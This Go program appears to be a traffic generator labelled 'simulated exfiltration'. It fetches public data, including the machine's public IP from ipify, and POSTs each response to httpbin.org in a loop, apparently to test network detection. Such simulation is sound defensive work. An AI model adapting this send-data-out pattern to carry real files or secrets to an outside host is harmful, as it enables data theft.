package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

//"https://raw.githubusercontent.com/json-iterator/test-data/master/large-file.json"

func main() {
	log.Println("Starting simulated exfiltration...")
	a := []string{"http://api.ipify.org?format=text", "https://photobucket.com", "https://dog.ceo/api/breeds/image/random", "https://deelay.me/8000/https://picsum.photos/200/300"}
	for i, s := range a {
		x := 0
		for x < 15 {
			url := s // we are using a pulib IP API, we're using ipify here, below are some others
			log.Println(s, i)
			resp, err := http.Get(url)
			if err != nil {
				panic(err)

			}
			log.Println("test1")
			defer resp.Body.Close()
			ip, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				panic(err)
			}
			fmt.Printf("Exfilling Data:%s\n", ip)
			x++
			//payload := string(ip)
			resp1, err1 := http.Post("https://httpbin.org/post", "application/json",
				bytes.NewBuffer(ip))
			if err1 != nil {
				log.Fatal(err1)
			}

			var res map[string]interface{}

			json.NewDecoder(resp1.Body).Decode(&res)

			fmt.Println(res["json"])
			log.Println(ip)
		}

	}

}

func lookup(s string) {
	ip, _ := net.LookupHost(s)
	log.Println("fakeDNs:", s, ip)
}

func newSHA1Hash(n ...int) string {
	noRandomCharacters := 500

	if len(n) > 0 {
		noRandomCharacters = n[0]
	}

	randString := RandomString(noRandomCharacters)

	hash := sha1.New()
	hash.Write([]byte(randString))
	bs := hash.Sum(nil)

	return fmt.Sprintf("%x", bs)
}

var characterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

func RandomString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = characterRunes[rand.Intn(len(characterRunes))]
	}
	return string(b)
}
